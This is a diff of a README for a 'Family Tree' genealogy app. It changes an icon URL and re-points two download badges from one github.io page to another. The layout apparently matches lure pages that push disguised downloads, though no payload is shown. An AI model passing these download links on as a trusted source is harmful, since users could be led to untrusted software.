@@ -1,11 +1,11 @@
 # Family Tree – Genealogy and Family History Research Tool
 
 <p align="center">
-  <img src="https://icon-icons.com/download-file?file=https%3A%2F%2Fimages.icon-icons.com%2F277%2FPNG%2F512%2FMacFamilyTree_30181.png&id=30181&pack_or_individual=pack" width="150" alt="Family Tree icon"/>
+  <img src="https://images.icon-icons.com/277/PNG/512/MacFamilyTree_30181.png" width="150" alt="Family Tree icon"/>
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/familyTree">
+  <a href="https://polycia-apps.github.io/.github/familyTree">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Family Tree"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ DNA genealogy integration represents the frontier of family history research —
 
 <p align="center">
 
-[![Get it Now Family Tree](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/familyTree)
+[![Get it Now Family Tree](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/familyTree)
 
 </p>
 
